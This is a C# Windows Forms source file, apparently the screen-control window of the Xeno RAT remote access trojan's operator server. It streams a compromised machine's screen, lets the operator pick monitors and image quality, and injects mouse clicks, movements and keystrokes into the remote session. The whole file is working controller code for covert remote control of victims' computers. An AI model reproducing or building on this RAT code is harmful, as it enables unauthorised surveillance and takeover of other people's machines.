using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class ScreenControl : Form
    {
        Node client;
        Node ImageNode;
        bool playing = false;
        int monitor_index = 0;
        double scaling_factor = 1;
        Size? current_mon_size = null;
        string[] qualitys = new string[] { "100%","90%", "80%", "70%", "60%", "50%", "40%", "30%", "20%", "10%" };
        public ScreenControl(Node _client)
        {
            client = _client;
            InitializeComponent();

            client.AddTempOnDisconnect(TempOnDisconnect);
            comboBox2.Items.AddRange(qualitys);
            InitializeAsync();

        }
        private async Task InitializeAsync() 
        {
            ImageNode = await CreateImageNode();
            ImageNode.AddTempOnDisconnect(TempOnDisconnect);
            await RefreshMons();
            await RecvThread();
        }
        public void TempOnDisconnect(Node node)
        {
            if (node == client || (node == ImageNode && ImageNode != null))
            {
                client?.Disconnect();
                ImageNode?.Disconnect();
                if (!this.IsDisposed)
                {
                    this.Invoke((MethodInvoker)(() =>
                    {
                        this.Close();
                    }));
                }
            }
        }
        public async Task RefreshMons() 
        {
            string[] monitors = await GetMonitors();
            comboBox1.Items.Clear();
            comboBox1.Items.AddRange(monitors);
            if (monitors.Length == 0)
            {
                button2.Enabled = false;
            }
            else
            {
                button2.Enabled = true;
                await SetMonitor(0);
            }
        }

        public async Task start() 
        {
            await client.SendAsync(new byte[] { 0 });
        }
        public async Task stop()
        {
            await client.SendAsync(new byte[] { 1 });
        }
        public async Task<string[]> GetMonitors()
        {
            await client.SendAsync(new byte[] { 2 });
            string monsString=Encoding.UTF8.GetString(await client.ReceiveAsync());
            string[] mons = monsString.Split('\n');
            return mons;
        }
        public async Task SetQuality(int quality) 
        {
            await client.SendAsync(client.sock.Concat(new byte[] { 3 }, client.sock.IntToBytes(quality)));
        }

        public async Task SetMonitor(int monitorIndex)
        {
            monitor_index = monitorIndex;
            await client.SendAsync(client.sock.Concat(new byte[] { 4 }, client.sock.IntToBytes(monitorIndex)));
            byte[] hwData = await client.ReceiveAsync();
            int Width = client.sock.BytesToInt(hwData);
            int Height = client.sock.BytesToInt(hwData,4);
            current_mon_size = new Size(Width, Height);
            UpdateScaleSize();
        }

        public async Task UpdateScaleSize() 
        {
            if (pictureBox1.Width > ((Size)current_mon_size).Width || pictureBox1.Height > ((Size)current_mon_size).Height)
            {
                await client.SendAsync(client.sock.Concat(new byte[] { 13 }, client.sock.IntToBytes(10000)));
            }
            else
            {
                double widthRatio = (double)pictureBox1.Width/ (double)((Size)current_mon_size).Width ;
                double heightRatio = (double)pictureBox1.Height / (double)((Size)current_mon_size).Height;
                scaling_factor = Math.Max(widthRatio, heightRatio);
                int factor = (int)(scaling_factor * 10000.0);
                await client.SendAsync(client.sock.Concat(new byte[] { 13 }, client.sock.IntToBytes(factor)));
            }
        }

        public async Task RecvThread() 
        {
            while (ImageNode.Connected()) 
            {
                byte[] data = await ImageNode.ReceiveAsync();
                if (data == null) 
                {
                    break;
                }
                if (playing)
                {
                    try
                    {

                        System.Drawing.Image image;
                        using (MemoryStream ms = new MemoryStream(data))
                        {
                            image = System.Drawing.Image.FromStream(ms);
                        }
                        pictureBox1.BeginInvoke(new Action(() =>
                        {
                            if (pictureBox1.Image != null)
                            {
                                pictureBox1.Image.Dispose();
                                pictureBox1.Image = null;
                            }
                            pictureBox1.Image = image;
                        }));
                    }
                    catch { }
                    //update picturebox
                }
            }
        }
        private async Task<Node> CreateImageNode()
        {
            if (ImageNode != null)
            {
                return ImageNode;
            }
            Node SubSubNode = await client.Parent.CreateSubNodeAsync(2);
            int id = await Utils.SetType2setIdAsync(SubSubNode);
            if (id != -1)
            {
                await Utils.Type2returnAsync(SubSubNode);
                byte[] a = SubSubNode.sock.IntToBytes(id);
                await client.SendAsync(a);
                byte[] found = await client.ReceiveAsync();
                if (found == null || found[0] == 0)
                {
                    SubSubNode.Disconnect();
                    return null;
                }
            }
            else
            {
                SubSubNode.Disconnect();
                return null;
            }
            return SubSubNode;
        }
        public Point TranslateCoordinates(Point originalCoords, Size originalScreenSize, PictureBox targetControl)
        {
            // Calculate the scaling factors
            float scaleX = (float)targetControl.Image.Width / originalScreenSize.Width;
            float scaleY = (float)targetControl.Image.Height / originalScreenSize.Height;

            // Apply the scaling factors
            int scaledX = (int)(originalCoords.X * scaleX/ scaling_factor);
            int scaledY = (int)(originalCoords.Y * scaleY/ scaling_factor);

            // Get the unzoomed and offset-adjusted coordinates
            Point translatedCoords = UnzoomedAndAdjusted(targetControl, new Point(scaledX, scaledY));

            return translatedCoords;
        }

        private Point UnzoomedAndAdjusted(PictureBox pictureBox, Point scaledPoint)
        {
            // Calculate the zoom factor
            float zoomFactor = Math.Min(
                (float)pictureBox.ClientSize.Width / pictureBox.Image.Width,
                (float)pictureBox.ClientSize.Height / pictureBox.Image.Height);

            // Get the displayed rectangle of the image
            Rectangle displayedRect = GetImageDisplayRectangle(pictureBox);

            // Offset and unzoom the coordinates
            int translatedX = (int)((scaledPoint.X - displayedRect.X) / zoomFactor);
            int translatedY = (int)((scaledPoint.Y - displayedRect.Y) / zoomFactor);

            return new Point(translatedX, translatedY);
        }
        private Point Unzoomed(PictureBox pictureBox, Point zoomedPoint)
        {
            // Get the scaling factor
            float zoomFactor = Math.Max(
                (float)pictureBox.ClientSize.Width / pictureBox.Image.Width,
                (float)pictureBox.ClientSize.Height / pictureBox.Image.Height);

            // Calculate the bounding rectangle of the displayed image
            Rectangle displayedRect = GetImageDisplayRectangle(pictureBox);

            // Calculate the corresponding position on the image
            int imageX = (int)((zoomedPoint.X - displayedRect.X) / zoomFactor);
            int imageY = (int)((zoomedPoint.Y - displayedRect.Y) / zoomFactor);

            return new Point(imageX, imageY);
        }

        private Rectangle GetImageDisplayRectangle(PictureBox pictureBox)
        {
            if (pictureBox.SizeMode == PictureBoxSizeMode.Normal)
            {
                return new Rectangle(0, 0, pictureBox.Image.Width, pictureBox.Image.Height);
            }
            else if (pictureBox.SizeMode == PictureBoxSizeMode.StretchImage)
            {
                return pictureBox.ClientRectangle;
            }
            else
            {
                float zoomFactor = Math.Min(
                    (float)pictureBox.ClientSize.Width / pictureBox.Image.Width,
                    (float)pictureBox.ClientSize.Height / pictureBox.Image.Height);

                int imageWidth = (int)(pictureBox.Image.Width * zoomFactor);
                int imageHeight = (int)(pictureBox.Image.Height * zoomFactor);

                int imageX = (pictureBox.ClientSize.Width - imageWidth) / 2;
                int imageY = (pictureBox.ClientSize.Height - imageHeight) / 2;

                return new Rectangle(imageX, imageY, imageWidth, imageHeight);
            }
        }




        private void ScreenControl_Load(object sender, EventArgs e)
        {

        }

        private async void button2_Click(object sender, EventArgs e)
        {
            await start();
            playing = true;
        }

        private async void button3_Click(object sender, EventArgs e)
        {
            await stop();
            playing = false;
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            await RefreshMons();
        }

        private async void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = comboBox1.SelectedIndex;
            if (selectedIndex != -1)
            {
                await SetMonitor(selectedIndex);
            }
        }

        private async void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = comboBox2.SelectedIndex;
            if (selectedIndex != -1)
            {
                await SetQuality(int.Parse(qualitys[selectedIndex].Replace("%", "")));
                
            }
        }

        private async void pictureBox1_MouseClick(object sender, MouseEventArgs e)
        {
            if (pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
            //operation_pass = false
            Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
            byte opcode = 5;
            if (e.Button == MouseButtons.Right)
            {
                opcode = 9;
            }
            else if (e.Button == MouseButtons.Middle)
            {
                opcode = 10;
            }
            byte[] payload = client.sock.Concat(new byte[] { opcode }, client.sock.IntToBytes(coords.X));
            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
            await client.SendAsync(payload);

        }

        private async void pictureBox1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (current_mon_size==null|| pictureBox1.Image == null || !playing || e.Button == MouseButtons.Right || e.Button==MouseButtons.Middle || !checkBox1.Checked) return;
            Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
            byte[] payload = client.sock.Concat(new byte[] { 6 }, client.sock.IntToBytes(coords.X));
            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
            await client.SendAsync(payload);
        }

        private async void pictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            //return;
            if (current_mon_size == null || pictureBox1.Image == null || !playing || e.Button==MouseButtons.Right || e.Button == MouseButtons.Middle || !checkBox1.Checked) return;
            Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
            byte[] payload = client.sock.Concat(new byte[] { 7 }, client.sock.IntToBytes(coords.X));
            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
            await client.SendAsync(payload);
        }

        private async void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            if (current_mon_size == null || pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
            //return;
            Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
            byte[] payload = client.sock.Concat(new byte[] { 11 }, client.sock.IntToBytes(coords.X));
            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
            await client.SendAsync(payload);
        }

        private async void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            //return;
            if (current_mon_size == null || pictureBox1.Image == null || !playing || e.Button == MouseButtons.Right || e.Button == MouseButtons.Middle || !checkBox1.Checked) return;
            Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
            byte[] payload = client.sock.Concat(new byte[] { 8 }, client.sock.IntToBytes(coords.X));
            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
            await client.SendAsync(payload);
        }

        private void pictureBox1_PreviewKeyDown(object sender, PreviewKeyDownEventArgs e)
        {
            if (current_mon_size == null || pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void ScreenControl_KeyPress(object sender, KeyPressEventArgs e)
        {
            
        }

        private void ScreenControl_KeyDown(object sender, KeyEventArgs e)
        {

        }

        private async void ScreenControl_KeyUp(object sender, KeyEventArgs e)
        {
            if (current_mon_size == null || pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
            await client.SendAsync(client.sock.Concat(new byte[] { 12 }, client.sock.IntToBytes(e.KeyValue)));
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                checkBox1.Text = "Enabled";
            }
            else 
            {
                checkBox1.Text = "Disabled";
            }
        }

        private void pictureBox1_SizeChanged(object sender, EventArgs e)
        {
            UpdateScaleSize();
        }
    }
}
